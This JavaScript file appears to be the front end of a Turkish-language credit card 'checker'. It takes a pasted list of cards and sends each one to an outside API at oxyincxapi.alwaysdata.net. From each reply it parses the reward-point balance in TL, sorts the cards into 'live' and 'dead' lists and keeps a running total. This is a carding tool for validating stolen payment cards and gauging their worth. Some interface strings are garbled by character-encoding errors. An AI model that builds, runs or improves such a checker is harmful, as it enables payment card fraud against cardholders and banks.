function showPanel(id){
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

// PUAN AYIKLAYICI
function extractPuan(text){
  let m = text.match(/Puan:\s*([0-9.,]+)/i);
  if(!m) return 0;
  let v = m[1].replace(/\./g,"").replace(",",".");
  return parseFloat(v) || 0;
}

// CHECKER
async function startCheck(){
  const btn=document.getElementById('startBtn');
  btn.disabled=true;
  btn.innerText='â³ Bekle kanksâ€¦ checkleniyorâ€¦';

  const lines=document.getElementById('cardsInput').value.trim().split("\n");
  const liveList=document.getElementById('liveList');
  const deadList=document.getElementById('deadList');
  liveList.innerHTML='';
  deadList.innerHTML='';
  let sum=0;

  for(const card of lines){
    if(!card.trim()) continue;

    const r=await fetch(`https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=${encodeURIComponent(card)}`);
    const t=await r.text();

    const puan = extractPuan(t);

    if(puan > 0){
      sum += puan;
      liveList.innerHTML += `<div class='live-item'><b>${card}</b><br>Puan: ${puan.toFixed(2)} TL</div>`;
    } else {
      deadList.innerHTML += `<div class='dead-item'><b>${card}</b><br>${t}</div>`;
    }

    document.getElementById('liveTotal').innerText = `Toplam Puan: ${sum.toFixed(2)} TL`;
    await new Promise(r=>setTimeout(r,500));
  }

  btn.disabled=false;
  btn.innerText='Kontrol BaÅŸlat';
}
